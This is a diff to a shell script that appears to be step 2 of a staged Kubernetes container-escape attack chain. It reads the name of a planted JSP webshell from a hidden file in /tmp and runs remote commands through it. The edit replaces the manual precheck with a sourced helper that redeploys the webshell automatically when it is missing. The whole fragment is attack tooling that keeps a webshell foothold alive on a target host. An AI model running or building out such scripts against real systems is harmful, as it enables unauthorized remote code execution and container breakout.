@@ -8,14 +8,13 @@
 
 [ -z "$HOST" ] && echo "ERROR: Set HOST variable first" && exit 1
 
-# Read webshell info from step 1
+# Read webshell info from step 1 (tolerant: ensure_webshell will redeploy if missing)
 SHELL_FILE="/tmp/.k8s-escape-shell"
+SHELL_NAME=""
+SHELL_URL=""
 if [ -f "$SHELL_FILE" ]; then
     SHELL_NAME=$(sed -n '1p' "$SHELL_FILE")
     SHELL_URL="http://${HOST}/app/${SHELL_NAME}.jsp"
-else
-    echo "ERROR: Run step 1 first (./01-exploit-rce.sh)"
-    exit 1
 fi
 
 remote_exec() {
@@ -35,23 +34,19 @@ remote_exec() {
         | grep -v '^- $'
 }
 
+# shellcheck source=lib/webshell-precheck.sh
+source "$(dirname "$0")/lib/webshell-precheck.sh"
+
 echo ""
 echo "================================================"
 echo "  STEP 2: Container Escape"
 echo "================================================"
+
+# ── Pre-check: verify webshell is accessible (auto-redeploys via step 1 if down) ──
+echo "> Verifying webshell is accessible..."
+ensure_webshell || exit 1
 echo "  Webshell: ${SHELL_NAME}.jsp"
 echo "  URL: ${SHELL_URL}"
-echo ""
-
-# ── Pre-check: verify webshell is accessible ──
-echo "> Verifying webshell is accessible..."
-PRECHECK=$(remote_exec "id")
-if [ -z "$PRECHECK" ] || ! echo "$PRECHECK" | grep -q "uid="; then
-    echo "  [FAIL] Webshell is not responding (HTTP error or missing JSP)"
-    echo "  Re-run step 1 first: ./01-exploit-rce.sh"
-    exit 1
-fi
-echo "  [OK] Webshell responding: $(echo "$PRECHECK" | head -1)"
 echo ""
 
 # ── 2.1 Verify container ────────────────────
